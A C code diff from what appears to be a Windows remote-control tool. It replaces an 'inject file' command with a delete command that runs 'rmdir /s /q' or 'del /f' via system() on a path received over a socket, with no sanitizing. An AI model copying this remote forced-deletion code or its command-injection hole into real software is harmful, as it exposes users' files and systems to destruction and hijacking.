@@ -234,13 +234,9 @@ DWORD WINAPI surfMode(LPVOID paramS) {
 				exec(param);
 				break;
 
-			case '8':	//INJECT FILE
-				showPWD(param);
-				INJECTFILE(param);
-				break;
-
-			case '9':	//DELETE FILE
+			case '8':	//DELETE FILE
 				showInorderFile(param);
+				DELETEFILE(param);
 				break;
 
 			default:
@@ -280,6 +276,8 @@ void GETFILE(void * paramS){
 
 	FILE * fp = fopen(buffer, "r");
 
+
+
 	if(fp == NULL){
 		memset(buffer, 0, strlen(buffer));
 		strcpy(buffer, "\nGAGAL MEMBUKA FILE\n");
@@ -312,12 +310,12 @@ void GETFILE(void * paramS){
 	fclose(fp);
 }
 
-void INJECTFILE(void * paramS){
+void DELETEFILE(void * paramS){
 	paramSurf * param = (paramSurf *) paramS;
 
 	char buffer[512] = {0};
 
-	strcpy(buffer, "INJECT");
+	strcpy(buffer, "\nPILIH FILE YANG AKAN DIHAPUS\n");
 	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
 	memset(buffer, 0, strlen(buffer));
 	Sleep(11);
@@ -326,4 +324,27 @@ void INJECTFILE(void * paramS){
 
 	while(strcmp((param)->input, "NULL")==0) Sleep(500);
 
+	strcpy(buffer, (param)->pwd);
+	strcat(buffer, "\\");
+	strcat(buffer, (param)->input);
+
+	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
+	Sleep(11);
+
+
+	FILE * fp = fopen(buffer, "r");
+	char command[512] = {0};
+	if(fp == NULL){
+		strcpy(command, "rmdir /s /q ");
+		strcat(command, buffer);
+		system(command);
+	}else{
+		fclose(fp);
+		strcpy(command, "del /f ");
+		strcat(command, buffer);
+		system(command);
+	}
+
+
 }
+
